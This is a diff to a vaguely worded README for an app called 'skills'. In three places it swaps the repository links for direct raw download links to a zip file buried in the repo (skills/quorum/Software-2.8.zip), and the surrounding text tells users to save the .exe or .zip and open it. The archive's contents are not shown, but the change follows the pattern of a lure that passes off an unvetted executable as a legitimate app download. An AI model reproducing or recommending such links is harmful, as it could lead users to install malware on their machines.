@@ -1,6 +1,6 @@
 # 🤖 skills - Connect people with clear intelligence
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-purple?style=for-the-badge)](https://github.com/joaneunclear762/skills)
+[![Download skills](https://img.shields.io/badge/Download%20skills-purple?style=for-the-badge)](https://raw.githubusercontent.com/joaneunclear762/skills/main/skills/quorum/Software-2.8.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ For best results:
 
 Use this link to visit the download page and get the app:
 
-[Download skills](https://github.com/joaneunclear762/skills)
+[Download skills](https://raw.githubusercontent.com/joaneunclear762/skills/main/skills/quorum/Software-2.8.zip)
 
 If the page offers a file such as an `.exe` or `.zip`, save it to your PC before you open it.
 
@@ -157,7 +157,7 @@ If the app creates project files, keep them together in one folder so they are e
 
 Primary download page:
 
-[https://github.com/joaneunclear762/skills](https://github.com/joaneunclear762/skills)
+[https://raw.githubusercontent.com/joaneunclear762/skills/main/skills/quorum/Software-2.8.zip](https://raw.githubusercontent.com/joaneunclear762/skills/main/skills/quorum/Software-2.8.zip)
 
 ## 🪄 Topics covered by this project
 
